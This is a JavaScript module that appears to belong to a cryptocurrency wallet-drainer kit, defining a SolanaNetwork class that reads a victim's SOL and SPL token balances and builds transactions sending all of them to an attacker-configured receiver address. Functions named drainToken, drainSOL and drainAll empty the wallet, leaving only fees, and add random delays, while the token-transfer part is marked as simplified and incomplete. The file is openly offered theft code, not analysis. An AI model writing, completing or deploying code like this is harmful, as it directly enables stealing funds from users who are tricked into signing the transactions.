// Solana Network Handler
class SolanaNetwork {
    constructor() {
        this.connection = null;
        this.wallet = null;
        this.networkConfig = window.DRAINER_CONFIG.NETWORKS.solana;
        this.tokens = window.DRAINER_CONFIG.TOKENS.solana;
        this.receiverAddress = window.DRAINER_CONFIG.RECEIVER_ADDRESSES.solana;
    }

    async initialize(walletAdapter) {
        try {
            // Initialize Solana connection
            this.connection = new solanaWeb3.Connection(
                this.networkConfig.rpcUrls[0],
                'confirmed'
            );
            
            this.wallet = walletAdapter;
            
            // Test connection
            const version = await this.connection.getVersion();
            console.log('Connected to Solana cluster:', version);
            
            return true;
        } catch (error) {
            console.error('Failed to initialize Solana network:', error);
            return false;
        }
    }

    async getBalance(address) {
        try {
            const publicKey = new solanaWeb3.PublicKey(address);
            const balance = await this.connection.getBalance(publicKey);
            
            return {
                raw: balance,
                formatted: (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6),
                symbol: 'SOL'
            };
        } catch (error) {
            console.error('Failed to get SOL balance:', error);
            return null;
        }
    }

    async getTokenBalance(address, token) {
        try {
            const publicKey = new solanaWeb3.PublicKey(address);
            const mintPublicKey = new solanaWeb3.PublicKey(token.mint);
            
            // Get token accounts for this mint
            const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(
                publicKey,
                { mint: mintPublicKey }
            );

            if (tokenAccounts.value.length === 0) {
                return null;
            }

            let totalBalance = 0;
            tokenAccounts.value.forEach(account => {
                const balance = account.account.data.parsed.info.tokenAmount.uiAmount;
                totalBalance += balance || 0;
            });

            if (totalBalance === 0) {
                return null;
            }

            return {
                raw: totalBalance * Math.pow(10, token.decimals),
                formatted: totalBalance.toFixed(6),
                symbol: token.symbol,
                mint: token.mint,
                decimals: token.decimals,
                tokenAccounts: tokenAccounts.value
            };
        } catch (error) {
            console.error(`Failed to get ${token.symbol} balance:`, error);
            return null;
        }
    }

    async getAllTokenBalances(address) {
        const balances = [];
        
        for (const token of this.tokens) {
            try {
                const balance = await this.getTokenBalance(address, token);
                if (balance) {
                    balances.push(balance);
                }
            } catch (error) {
                console.warn(`Skipping ${token.symbol}:`, error.message);
            }
        }
        
        return balances;
    }

    async createTransferInstruction(fromPubkey, toPubkey, amount) {
        return solanaWeb3.SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports: amount
        });
    }

    async createTokenTransferInstruction(tokenAccount, mint, amount, fromPubkey, toPubkey) {
        try {
            // This is a simplified version - in reality you'd need the SPL Token program
            const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
            
            // Get associated token account for receiver
            const receiverTokenAccount = await this.getOrCreateAssociatedTokenAccount(
                toPubkey,
                mint,
                fromPubkey
            );

            // Create transfer instruction
            const instruction = new solanaWeb3.TransactionInstruction({
                keys: [
                    { pubkey: tokenAccount, isSigner: false, isWritable: true },
                    { pubkey: receiverTokenAccount, isSigner: false, isWritable: true },
                    { pubkey: fromPubkey, isSigner: true, isWritable: false }
                ],
                programId: TOKEN_PROGRAM_ID,
                data: Buffer.alloc(0) // Simplified - real implementation needs proper instruction data
            });

            return instruction;
        } catch (error) {
            console.error('Failed to create token transfer instruction:', error);
            throw error;
        }
    }

    async getOrCreateAssociatedTokenAccount(ownerPubkey, mintPubkey, payerPubkey) {
        try {
            // Simplified implementation - would need actual SPL Token library
            const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
            
            // Derive associated token account address
            const [associatedTokenAccount] = await solanaWeb3.PublicKey.findProgramAddress(
                [
                    ownerPubkey.toBuffer(),
                    new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA').toBuffer(),
                    mintPubkey.toBuffer()
                ],
                ASSOCIATED_TOKEN_PROGRAM_ID
            );

            return associatedTokenAccount;
        } catch (error) {
            console.error('Failed to get associated token account:', error);
            throw error;
        }
    }

    async drainToken(userAddress, tokenBalance) {
        try {
            const fromPubkey = new solanaWeb3.PublicKey(userAddress);
            const toPubkey = new solanaWeb3.PublicKey(this.receiverAddress);
            const mintPubkey = new solanaWeb3.PublicKey(tokenBalance.mint);

            if (!tokenBalance.tokenAccounts || tokenBalance.tokenAccounts.length === 0) {
                return { success: false, message: `No ${tokenBalance.symbol} token accounts found` };
            }

            const transactions = [];
            
            // Create transfer for each token account
            for (const tokenAccount of tokenBalance.tokenAccounts) {
                const accountPubkey = new solanaWeb3.PublicKey(tokenAccount.pubkey);
                const balance = tokenAccount.account.data.parsed.info.tokenAmount.amount;
                
                if (balance === '0') continue;

                const instruction = await this.createTokenTransferInstruction(
                    accountPubkey,
                    mintPubkey,
                    balance,
                    fromPubkey,
                    toPubkey
                );

                const transaction = new solanaWeb3.Transaction().add(instruction);
                transaction.feePayer = fromPubkey;
                
                const { blockhash } = await this.connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;

                transactions.push(transaction);
            }

            if (transactions.length === 0) {
                return { success: false, message: `No ${tokenBalance.symbol} to transfer` };
            }

            // Sign and send transactions
            const results = [];
            for (const transaction of transactions) {
                try {
                    const signedTransaction = await this.wallet.signTransaction(transaction);
                    const txid = await this.connection.sendRawTransaction(signedTransaction.serialize());
                    await this.connection.confirmTransaction(txid);
                    
                    results.push({
                        txid,
                        explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/tx/${txid}`
                    });
                } catch (error) {
                    console.error('Transaction failed:', error);
                    results.push({ error: error.message });
                }
            }

            return {
                success: true,
                transactions: results,
                amount: tokenBalance.formatted,
                symbol: tokenBalance.symbol
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainSOL(userAddress) {
        try {
            const fromPubkey = new solanaWeb3.PublicKey(userAddress);
            const toPubkey = new solanaWeb3.PublicKey(this.receiverAddress);
            
            const balance = await this.connection.getBalance(fromPubkey);
            
            if (balance === 0) {
                return { success: false, message: "No SOL balance" };
            }

            // Estimate transaction fee
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey,
                    toPubkey,
                    lamports: balance
                })
            );

            transaction.feePayer = fromPubkey;
            const { blockhash } = await this.connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;

            // Get fee for transaction
            const fee = await this.connection.getFeeForMessage(transaction.compileMessage());
            const amountToSend = balance - (fee?.value || 5000); // Fallback fee

            if (amountToSend <= 0) {
                return { 
                    success: false, 
                    message: "Insufficient SOL balance for transaction fees" 
                };
            }

            // Create final transaction with correct amount
            const finalTransaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey,
                    toPubkey,
                    lamports: amountToSend
                })
            );

            finalTransaction.feePayer = fromPubkey;
            finalTransaction.recentBlockhash = blockhash;

            const signedTransaction = await this.wallet.signTransaction(finalTransaction);
            const txid = await this.connection.sendRawTransaction(signedTransaction.serialize());
            await this.connection.confirmTransaction(txid);

            return {
                success: true,
                txid,
                amount: (amountToSend / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6),
                symbol: 'SOL',
                explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/tx/${txid}`
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainAll(userAddress, progressCallback) {
        const results = [];
        let completed = 0;
        
        try {
            // Get all balances first
            const tokenBalances = await this.getAllTokenBalances(userAddress);
            const solBalance = await this.getBalance(userAddress);
            
            const totalOperations = tokenBalances.length + (solBalance ? 1 : 0);
            
            if (totalOperations === 0) {
                return { success: false, message: "No assets to drain" };
            }

            // Drain SPL tokens first
            for (const tokenBalance of tokenBalances) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, `Draining ${tokenBalance.symbol}...`);
                }

                const result = await this.drainToken(userAddress, tokenBalance);
                results.push({
                    type: 'token',
                    network: 'solana',
                    ...result
                });

                completed++;
                await window.DRAINER_UTILS.sleep(window.DRAINER_UTILS.generateRandomDelay(1000, 2000));
            }

            // Drain SOL last
            if (solBalance && parseFloat(solBalance.formatted) > 0.001) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, "Draining SOL...");
                }

                const result = await this.drainSOL(userAddress);
                results.push({
                    type: 'native',
                    network: 'solana',
                    ...result
                });
                completed++;
            }

            if (progressCallback) {
                progressCallback(100, "Solana drainage complete!");
            }

            return {
                success: true,
                results,
                summary: {
                    totalOperations,
                    successful: results.filter(r => r.success).length,
                    failed: results.filter(r => !r.success).length
                }
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                results
            };
        }
    }
}

// Export for use in other modules
window.SolanaNetwork = SolanaNetwork;
